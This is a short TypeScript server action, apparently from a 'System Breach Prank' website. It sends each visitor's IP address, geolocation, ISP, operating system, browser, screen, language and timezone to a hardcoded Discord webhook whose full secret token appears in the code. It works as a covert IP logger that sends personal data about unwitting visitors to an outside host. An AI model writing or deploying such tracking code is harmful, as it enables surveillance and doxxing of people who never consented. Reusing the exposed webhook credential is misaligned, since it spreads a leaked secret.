'use server'

interface UserInfo {
  ip: string
  city: string
  region: string
  country_name: string
  org: string
  system: {
    os: string
    browser: string
    screen: string
    language: string
    timeZone: string
  }
  timestamp: string
}

export async function sendToDiscord(userInfo: UserInfo) {
  const webhookUrl = 'https://discord.com/api/webhooks/1314828543452250174/Fw_CE39vemYSTeDNfXfsH7nidJKcV51P4vw5BUOgGvmoF51vjTyovE12zP-lmLQ9Ml_x'

  try {
    const embed = {
      title: '🚨 New System Breach Visit',
      color: 0xFF0000, // Red color
      fields: [
        {
          name: '📍 Location',
          value: `${userInfo.city}, ${userInfo.region}, ${userInfo.country_name}`,
          inline: true
        },
        {
          name: '🌐 Network',
          value: `IP: ${userInfo.ip}\nISP: ${userInfo.org}`,
          inline: true
        },
        {
          name: '💻 System',
          value: `OS: ${userInfo.system.os}\nBrowser: ${userInfo.system.browser}\nScreen: ${userInfo.system.screen}`,
          inline: false
        },
        {
          name: '🌍 Locale',
          value: `Language: ${userInfo.system.language}\nTimezone: ${userInfo.system.timeZone}`,
          inline: false
        }
      ],
      timestamp: userInfo.timestamp,
      footer: {
        text: 'System Breach Prank'
      }
    }

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] })
    })

    if (!response.ok) {
      throw new Error(`Discord API responded with status ${response.status}`)
    }

    return { success: true }
  } catch (error) {
    console.error('Discord webhook error:', error)
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error occurred' }
  }
}

